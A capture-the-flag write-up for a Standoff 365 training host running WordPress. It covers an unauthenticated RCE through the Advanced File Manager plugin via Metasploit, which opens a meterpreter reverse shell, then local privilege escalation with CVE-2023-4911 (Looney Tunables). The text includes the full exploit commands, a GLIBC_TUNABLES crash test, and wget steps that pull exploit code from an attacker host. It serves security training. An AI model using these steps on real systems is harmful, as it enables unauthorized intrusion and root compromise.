# library.edu.stf — RCE & LPE — Standoff 365
<img width="1920" height="797" alt="Screenshot From 2026-03-16 15-48-59" src="https://github.com/user-attachments/assets/ea941245-417f-4d24-86d8-b93e031c23d5" />

![](https://img.shields.io/badge/Platform-Standoff_365-purple?style=for-the-badge)
![](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![](https://img.shields.io/badge/OS-Linux-informational?style=for-the-badge&logo=linux&logoColor=white)
![](https://img.shields.io/badge/Category-Web%20%7C%20PrivEsc-orange?style=for-the-badge)
![](https://img.shields.io/badge/Tasks-web--1--1%20(RCE)%20%2B%20web--1--2%20(LPE)-red?style=for-the-badge)

## Summary

Two flags on a single WordPress host within the Standoff 365 Bootcamp perimeter. The site at `library.edu.stf` runs WordPress 6.9.4 with the **Advanced File Manager** plugin v5.0 — an outdated version vulnerable to unauthenticated RCE via shortcode injection. Metasploit delivers a meterpreter shell as `www-data` (**Flag 1 — RCE**). From there, the glibc dynamic loader (`ld.so`) is vulnerable to **CVE-2023-4911 (Looney Tunables)** — a buffer overflow in `GLIBC_TUNABLES` parsing that grants root-level code execution through a SUID binary (**Flag 2 — LPE**).

```
Perimeter Scan → WordPress Enum → Plugin Discovery (Advanced File Manager 5.0)
  → Unauth RCE via Shortcode Injection → Shell as www-data (Flag 1)
  → CVE-2023-4911 Looney Tunables → Root (Flag 2)
```

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | ID |
|:------|:-------|:----------|:---|
| Perimeter host sweep | [Discovery](https://attack.mitre.org/tactics/TA0007/) | [Network Service Discovery](https://attack.mitre.org/techniques/T1046/) | `T1046` |
| WordPress & plugin fingerprinting | [Reconnaissance](https://attack.mitre.org/tactics/TA0043/) | [Active Scanning: Vulnerability Scanning](https://attack.mitre.org/techniques/T1595/002/) | `T1595.002` |
| Plugin version via `readme.txt` | [Reconnaissance](https://attack.mitre.org/tactics/TA0043/) | [Gather Victim Host Info: Client Configurations](https://attack.mitre.org/techniques/T1592/004/) | `T1592.004` |
| Unauth RCE via File Manager plugin | [Initial Access](https://attack.mitre.org/tactics/TA0001/) | [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/) | `T1190` |
| Meterpreter → interactive shell | [Execution](https://attack.mitre.org/tactics/TA0002/) | [Command and Scripting Interpreter: Unix Shell](https://attack.mitre.org/techniques/T1059/004/) | `T1059.004` |
| Exploit transfer via `wget` | [Command and Control](https://attack.mitre.org/tactics/TA0011/) | [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/) | `T1105` |
| CVE-2023-4911 buffer overflow | [Privilege Escalation](https://attack.mitre.org/tactics/TA0004/) | [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068/) | `T1068` |
| SUID binary as overflow trigger | [Privilege Escalation](https://attack.mitre.org/tactics/TA0004/) | [Abuse Elevation Control: Setuid and Setgid](https://attack.mitre.org/techniques/T1548/001/) | `T1548.001` |

## Reconnaissance — `T1046` `T1595.002`

### Perimeter Discovery

The Bootcamp provides the external scope `10.124.1.224/27`. A host discovery sweep maps out the playing field before diving into any single target:

```bash
sudo nmap -sn 10.124.1.224/27
```

```
Nmap scan report for aircraft.edu.stf (10.124.1.231)
Nmap scan report for calculator.edu.stf (10.124.1.232)
Nmap scan report for library.edu.stf (10.124.1.233)
Nmap scan report for wp.edu.stf (10.124.1.234)
Nmap scan report for www.edu.stf (10.124.1.235)
Nmap scan report for gallery.edu.stf (10.124.1.236)
Nmap scan report for utils.edu.stf (10.124.1.237)
Nmap scan report for shop.edu.stf (10.124.1.238)
Nmap scan report for tokenizer.edu.stf (10.124.1.239)
Nmap scan report for bind.edu.stf (10.124.1.240)
Nmap scan report for smashmusic.edu.stf (10.124.1.241)
Nmap scan report for test-webserver.edu.stf (10.124.1.242)
Nmap scan report for vpn.edu.stf (10.124.1.253)
```

14 hosts alive, nearly all with domain names. These go straight into `/etc/hosts`. Our target is `library.edu.stf` at `10.124.1.233`.

### Port Scan — library.edu.stf

```bash
sudo nmap -sC -sV -v 10.124.1.233
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3
80/tcp   open  http    Apache httpd 2.4.54 ((Ubuntu))
|_http-generator: WordPress 6.9.4
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
8081/tcp open  blackice-icecap?
8082/tcp open  blackice-alerts?
```

Key findings: SSH on 22, Apache on 80 running **WordPress 6.9.4** (latest — no public CVEs for the core), and two additional ports (8081/8082) that turn out to be irrelevant.

### Web Enumeration

The homepage is bare — a single "Library" link leads to a file upload/download panel.

<img width="1919" height="884" alt="standoff365_web1_library_upload_files" src="https://github.com/user-attachments/assets/746f5836-9071-45ba-bde3-0d1ff46a1dad" />


A file upload interface in the wild immediately screams [file upload vulnerabilities](https://portswigger.net/web-security/file-upload), but the challenge hints point toward a vulnerable plugin rather than manual upload bypass.

### Plugin Discovery — `T1592.004`

Running `wpscan` with plugin enumeration comes back empty:

```bash
wpscan --url http://library.edu.stf/ --enumerate p
```

```
[i] Plugin(s) Identified:
[+] *
 | The version could not be determined.
```
Unhelpful. However, inspecting the page source reveals what `wpscan` missed:

<img width="1919" height="887" alt="Standoff365_web1_library_plugin" src="https://github.com/user-attachments/assets/8c861951-5fea-4996-9590-83e3c29d36e6" />

The source code references the **Advanced File Manager** plugin. Knowing that WordPress plugins live at `wp-content/plugins/<plugin-name>/` and typically ship with a `readme.txt`, we check:

```
http://library.edu.stf/wp-content/plugins/file-manager-advanced/readme.txt
```

This confirms the installed version is **5.0** (dated October 25, 2022). An outdated plugin on a current WordPress core — the classic weak link.

## Exploitation — `T1190` `T1059.004`

### Flag 1 — Unauthenticated RCE via Shortcode Injection

Searching Metasploit for the plugin name yields a direct hit:

<img width="1167" height="611" alt="Standoff365_web1_metasploit" src="https://github.com/user-attachments/assets/f6e613c9-c7f3-4150-80c2-fc22b9e90d3a" />

The module `exploit/multi/http/wp_plugin_fma_shortcode_unauth_rce` targets exactly this version — no authentication required.

```bash
msf6> use exploit/multi/http/wp_plugin_fma_shortcode_unauth_rce
msf6 exploit(...)> set vhost library.edu.stf
msf6 exploit(...)> set rhosts 10.124.1.233
msf6 exploit(...)> set targeturi /library
msf6 exploit(...)> set lhost tun0
msf6 exploit(...)> set srvhost tun0
msf6 exploit(...)> run
```

```
[*] Started reverse TCP handler on 10.127.205.39:4444
[+] The target appears to be vulnerable. fmakey successfully retrieved: 309c0f7bc9
[*] Executing PHP for php/meterpreter/reverse_tcp
[*] Sending stage (42137 bytes) to 10.124.1.221
[+] Deleted mPEYVmRqK.php
[*] Meterpreter session 1 opened (10.127.205.39:4444 -> 10.124.1.221:3065)
```

> **Note:** The `targeturi` must be set to `/library` (the subpath where the file manager panel lives), not the WordPress root. Without this, the exploit can't locate the vulnerable shortcode endpoint.

Drop into a shell and grab the first flag:

```bash
shell
cd /home
./rceflag
```

## Privilege Escalation — `T1068` `T1548.001`

### Flag 2 — CVE-2023-4911 (Looney Tunables)

Standard enumeration with `linpeas` reveals nothing suspicious — no obvious SUID misconfigurations, no writable cron jobs, no low-hanging fruit. The Bootcamp hint points to **CVE-2023-4911**, a buffer overflow in glibc's dynamic loader (`ld.so`).

#### How It Works

The vulnerability lives in how `ld.so` parses the `GLIBC_TUNABLES` environment variable. A specially crafted, oversized value overflows an internal buffer during startup of any SUID binary. Since `ld.so` runs before the target program's `main()`, the overflow occurs with elevated privileges — turning any SUID binary (like `/usr/bin/su`) into a root shell delivery mechanism.

#### Confirming Vulnerability

```bash
env -i "GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A" \
    "Z=$(printf '%08192x' 1)" /usr/bin/su --help
```

```
Segmentation fault (core dumped)
```

The segfault confirms the target's glibc is vulnerable.

#### Exploitation — `T1105`

Transfer the exploit files to the target via a Python HTTP server:

```bash
www-data@library:/tmp$ wget http://10.127.205.39/exp.c
www-data@library:/tmp$ wget http://10.127.205.39/libc.py
www-data@library:/tmp$ chmod +x *
www-data@library:/tmp$ python3 libc.py
www-data@library:/tmp$ gcc exp.c -o exp
www-data@library:/tmp$ ./exp
```

After a few minutes of brute-forcing offsets, the exploit lands:

```bash
id
uid=0(root) gid=33(www-data) groups=33(www-data)
./lpeflag
```

> **Note:** The exploit grants `uid=0` (root) while the `gid` remains `www-data`. This is sufficient for reading root-owned files and executing the flag binary.

## Lessons Learned

1. **`wpscan` isn't infallible.** Automated plugin enumeration missed the Advanced File Manager entirely. Always cross-reference with manual source code inspection — plugin references in HTML, JavaScript includes, and CSS paths often reveal what scanners overlook.

2. **WordPress core updates don't protect against plugin vulnerabilities.** The site ran the latest WordPress 6.9.4, yet a single outdated plugin (v5.0 from 2022) provided full unauthenticated RCE. In real-world assessments, plugins are almost always the weakest link.

3. **`readme.txt` is your version oracle.** WordPress plugins ship with `readme.txt` by default at a predictable path. This is the fastest way to fingerprint plugin versions when `wpscan` fails — and it works on virtually every WordPress installation.

4. **CVE-2023-4911 (Looney Tunables) is a universal LPE on unpatched glibc.** It requires no special SUID misconfigurations — any standard SUID binary (like `/usr/bin/su`) serves as the trigger. The segfault test is a quick way to confirm before committing to the full exploit chain.

5. **Perimeter mapping before target focus saves time.** The initial `-sn` sweep of the `/27` scope revealed all 14 hosts and their domain names upfront. This context prevents tunnel vision and helps correlate findings across machines later in the Bootcamp.

---

*Writeup by [@alfabuster](https://github.com/alfabuster)*
